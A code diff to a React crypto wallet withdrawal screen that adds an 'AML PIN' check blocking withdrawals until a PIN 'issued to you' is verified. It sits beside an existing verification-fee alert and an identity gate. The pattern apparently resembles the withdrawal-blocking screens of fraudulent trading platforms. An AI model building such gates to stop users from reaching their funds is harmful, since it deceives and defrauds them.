@@ -307,6 +307,12 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [verificationAttempts, setVerificationAttempts] = useState(0);
   const [verificationFailureMsg, setVerificationFailureMsg] = useState<string | null>(null);
 
+  // AML PIN state
+  const [amlPinInput, setAmlPinInput] = useState('');
+  const [amlPinVerified, setAmlPinVerified] = useState(false);
+  const [verifyingAmlPin, setVerifyingAmlPin] = useState(false);
+  const [amlPinError, setAmlPinError] = useState<string | null>(null);
+
   // Lockout state
   const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, lockedUntil: null });
 
@@ -433,12 +439,38 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       .catch(() => toast.error('Failed to copy'));
   };
 
+  const handleVerifyAmlPin = async () => {
+    if (!amlPinInput.trim()) {
+      toast.error('Please enter your AML PIN');
+      return;
+    }
+    setVerifyingAmlPin(true);
+    setAmlPinError(null);
+    try {
+      await api.verifyAmlPin(amlPinInput.trim());
+      setAmlPinVerified(true);
+      setAmlPinError(null);
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : 'Incorrect PIN';
+      setAmlPinError(msg);
+      setAmlPinVerified(false);
+    } finally {
+      setVerifyingAmlPin(false);
+    }
+  };
+
   const handleSend = async () => {
     if (isLocked) return;
 
     // Verification gate — blocks submission even when withdrawal_enabled=true
     if (wallet.verification_required) {
       toast.error('Identity verification is required before you can withdraw');
+      return;
+    }
+
+    // AML PIN gate
+    if (wallet.aml_pin_required && !amlPinVerified) {
+      toast.error('Please verify your AML PIN before submitting');
       return;
     }
 
@@ -470,7 +502,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
     setSubmitting(true);
     try {
-      await api.requestWithdrawal(asset, withdrawAmount, address.trim(), withdrawalMethod);
+      await api.requestWithdrawal(asset, withdrawAmount, address.trim(), withdrawalMethod, wallet.aml_pin_required ? amlPinInput.trim() : undefined);
       // Success — clear any lockout
       clearLockout(userKey.current);
       setLockout({ attempts: 0, lockedUntil: null });
@@ -855,6 +887,60 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             </div>
           )}
 
+          {/* ── AML PIN Verification (inline) ── */}
+          {wallet.aml_pin_required && !amlPinVerified && (
+            <div className="flex flex-col gap-4 p-4 rounded-xl border border-violet-500/30 bg-violet-500/10">
+              <div className="flex gap-3">
+                <ShieldAlert className="w-5 h-5 text-violet-400 shrink-0 mt-0.5" />
+                <div className="flex flex-col gap-1">
+                  <div className="text-sm font-semibold text-foreground">AML PIN Verification Required</div>
+                  <div className="text-xs text-muted/90 leading-relaxed">
+                    Enter the 8-character AML PIN issued to you to proceed with your withdrawal.
+                  </div>
+                </div>
+              </div>
+
+              {amlPinError && (
+                <div className="flex gap-2.5 items-start bg-destructive/10 border border-destructive/20 rounded-xl px-3 py-3">
+                  <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
+                  <p className="text-xs text-destructive leading-relaxed font-medium">{amlPinError}</p>
+                </div>
+              )}
+
+              <div className="flex gap-2">
+                <input
+                  type="text"
+                  value={amlPinInput}
+                  onChange={e => { setAmlPinInput(e.target.value.slice(0, 8)); setAmlPinError(null); }}
+                  maxLength={8}
+                  placeholder="Enter 8-character PIN"
+                  className="flex-1 bg-background border border-border rounded-xl px-4 py-3 text-foreground font-mono tracking-widest text-sm focus:outline-none focus:border-violet-500/60 transition-colors"
+                  onKeyDown={e => e.key === 'Enter' && handleVerifyAmlPin()}
+                />
+                <button
+                  onClick={handleVerifyAmlPin}
+                  disabled={verifyingAmlPin || amlPinInput.length !== 8}
+                  className="px-4 py-3 bg-violet-600 hover:bg-violet-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-xl text-sm transition-colors active:scale-[0.98] shrink-0"
+                >
+                  {verifyingAmlPin ? (
+                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                  ) : 'Verify'}
+                </button>
+              </div>
+            </div>
+          )}
+
+          {/* AML PIN verified success banner */}
+          {wallet.aml_pin_required && amlPinVerified && (
+            <div className="flex items-center gap-3 px-4 py-3.5 rounded-xl border border-violet-500/30 bg-violet-500/10">
+              <CheckCircle className="w-5 h-5 text-violet-400 shrink-0" />
+              <div>
+                <div className="text-sm font-semibold text-violet-400">AML PIN Verified</div>
+                <div className="text-xs text-muted mt-0.5">Identity confirmed — you may now submit your withdrawal.</div>
+              </div>
+            </div>
+          )}
+
           {/* Verification Fee alert */}
           {showVerificationFee && (
             <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
@@ -952,10 +1038,16 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           {/* Submit */}
           <button
             onClick={handleSend}
-            disabled={submitting || !!wallet.verification_required}
+            disabled={submitting || !!wallet.verification_required || (!!wallet.aml_pin_required && !amlPinVerified)}
             className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
           >
-            {submitting ? 'Processing…' : wallet.verification_required ? 'Verify Identity to Proceed' : 'Submit Withdrawal Request'}
+            {submitting
+              ? 'Processing…'
+              : wallet.verification_required
+                ? 'Verify Identity to Proceed'
+                : (wallet.aml_pin_required && !amlPinVerified)
+                  ? 'Enter AML PIN to Proceed'
+                  : 'Submit Withdrawal Request'}
           </button>
 
         </div>
